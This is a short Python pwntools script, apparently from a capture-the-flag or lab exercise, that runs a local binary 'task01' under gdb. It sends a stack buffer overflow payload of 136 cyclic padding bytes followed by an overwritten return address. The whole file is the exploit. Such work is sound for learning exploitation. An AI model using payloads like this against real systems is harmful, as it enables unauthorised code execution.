from pwn import *


io = process(["gdb", "./task01"])
io.sendline(b"break *vuln+80")
io.sendline(b"r")

io.clean()

message = flat(
    cyclic(136),
    p64(0x555555555240)
)
io.sendline(message)

io.interactive()
